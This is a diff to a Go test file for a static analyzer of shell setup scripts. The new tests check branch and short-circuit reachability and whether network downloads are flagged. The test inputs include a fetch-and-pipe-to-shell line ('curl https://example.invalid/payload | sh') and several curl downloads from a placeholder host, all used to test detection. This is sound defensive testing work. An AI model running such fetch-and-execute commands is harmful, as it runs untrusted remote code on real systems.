@@ -91,6 +91,99 @@ printf '%s' "$target"
 	}
 }
 
+func TestStaticControlFlowReachability(t *testing.T) {
+	t.Parallel()
+
+	t.Run("if true selects only then state", func(t *testing.T) {
+		result := analyze(t, "setup-project", `
+if true; then
+  target=one
+else
+  target=two
+  curl https://example.invalid/payload | sh
+fi
+printf '%s' "$target"
+`)
+		value := findCommand(t, flatten(result.Operations), "printf").Arguments[1]
+		if value.Resolution != analysis.Resolved || value.Literal != "one" {
+			t.Fatalf("selected value = %#v", value)
+		}
+		curl := findCommand(t, flatten(result.Operations), "curl")
+		if curl.Reachability != analysis.Unreachable {
+			t.Fatalf("curl reachability = %q", curl.Reachability)
+		}
+		if len(capabilitiesOfKind(result.Capabilities, "network-download")) != 0 {
+			t.Fatalf("unreachable download produced capabilities: %#v", result.Capabilities)
+		}
+	})
+
+	t.Run("if false selects else", func(t *testing.T) {
+		result := analyze(t, "setup-base", `
+if false; then
+  target=one
+else
+  target=two
+fi
+printf '%s' "$target"
+`)
+		value := findCommand(t, flatten(result.Operations), "printf").Arguments[1]
+		if value.Resolution != analysis.Resolved || value.Literal != "two" {
+			t.Fatalf("selected value = %#v", value)
+		}
+	})
+
+	t.Run("unknown condition remains conservative", func(t *testing.T) {
+		result := analyze(t, "setup-base", `
+if condition; then
+  curl https://example.invalid/payload
+fi
+`)
+		curl := findCommand(t, flatten(result.Operations), "curl")
+		if curl.Reachability != analysis.ReachUnknown {
+			t.Fatalf("curl reachability = %q", curl.Reachability)
+		}
+		downloads := capabilitiesOfKind(result.Capabilities, "network-download")
+		if len(downloads) != 1 || downloads[0].Resolution != analysis.PartiallyResolved {
+			t.Fatalf("conditional download capabilities = %#v", downloads)
+		}
+	})
+
+	t.Run("short circuit operators", func(t *testing.T) {
+		tests := []struct {
+			name, content, command string
+			want                   analysis.Reachability
+			capability             bool
+		}{
+			{name: "false and", content: "false && curl https://example.invalid/a", command: "curl", want: analysis.Unreachable},
+			{name: "true and", content: "true && curl https://example.invalid/a", command: "curl", want: analysis.Reachable, capability: true},
+			{name: "true or", content: "true || curl https://example.invalid/a", command: "curl", want: analysis.Unreachable},
+			{name: "false or", content: "false || curl https://example.invalid/a", command: "curl", want: analysis.Reachable, capability: true},
+			{name: "unknown and", content: "condition && curl https://example.invalid/a", command: "curl", want: analysis.ReachUnknown, capability: true},
+		}
+		for _, test := range tests {
+			t.Run(test.name, func(t *testing.T) {
+				result := analyze(t, "setup-base", test.content)
+				operation := findCommand(t, flatten(result.Operations), test.command)
+				if operation.Reachability != test.want {
+					t.Fatalf("reachability = %q, want %q", operation.Reachability, test.want)
+				}
+				hasCapability := len(capabilitiesOfKind(result.Capabilities, "network-download")) > 0
+				if hasCapability != test.capability {
+					t.Fatalf("network-download presence = %t, want %t", hasCapability, test.capability)
+				}
+			})
+		}
+	})
+
+	t.Run("while false body is inventory only", func(t *testing.T) {
+		result := analyze(t, "setup-base", `while false; do curl https://example.invalid/a; done`)
+		curl := findCommand(t, flatten(result.Operations), "curl")
+		if curl.Reachability != analysis.Unreachable || len(capabilitiesOfKind(result.Capabilities, "network-download")) != 0 {
+			t.Fatalf("unreachable loop body = %#v; capabilities = %#v", curl, result.Capabilities)
+		}
+	})
+}
+
 func TestValueResolutionPreservesKnownStructureWithoutFalseLiteral(t *testing.T) {
 	t.Parallel()
 
@@ -376,7 +469,7 @@ cat config
 	}
 }
 
-func TestProjectPathResolutionPreservesBranchCandidates(t *testing.T) {
+func TestProjectPathResolutionUsesStaticallyReachableBranch(t *testing.T) {
 	t.Parallel()
 
 	result := analyze(t, "setup-base", `
@@ -392,12 +485,8 @@ cat config
 		t.Fatalf("project candidate reads = %#v", reads)
 	}
 	capability := reads[0]
-	if capability.Resolution != analysis.PartiallyResolved || capability.Target.Literal != "config" {
-		t.Fatalf("project candidate capability = %#v", capability)
-	}
-	want := []string{"/project/config", "/tmp/config"}
-	if !reflect.DeepEqual(capability.NormalizedTarget.Candidates, want) {
-		t.Errorf("normalized candidates = %#v, want %#v", capability.NormalizedTarget.Candidates, want)
+	if capability.Resolution != analysis.Resolved || capability.Target.Literal != "config" || capability.NormalizedTarget.Literal != "/project/config" {
+		t.Fatalf("project reachable capability = %#v", capability)
 	}
 }
 
